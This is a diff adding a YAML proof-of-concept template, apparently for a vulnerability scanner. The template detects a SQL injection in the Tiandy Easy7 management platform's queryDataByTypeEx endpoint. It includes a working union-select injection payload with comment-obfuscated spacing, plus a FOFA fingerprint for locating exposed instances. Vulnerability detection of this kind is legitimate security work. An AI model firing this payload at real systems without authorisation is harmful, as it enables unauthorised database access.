@@ -1,0 +1,17 @@
+id: poc-yaml-tiandy-easy7-imp-querydatabytypeex-sqli
+info:
+  name: 天地伟业Easy7综合管理平台 queryDataByTypeEx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Easy7综合管理平台
+  fofa: app="Tiandy-Easy7"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/md5({{.t1}}),1
+  expression: status_code == 200 && contains(body,"\"content\":") && contains(body,"作案时机")
+    && contains(body,t2) && !contains(body,"<")
+transport: http
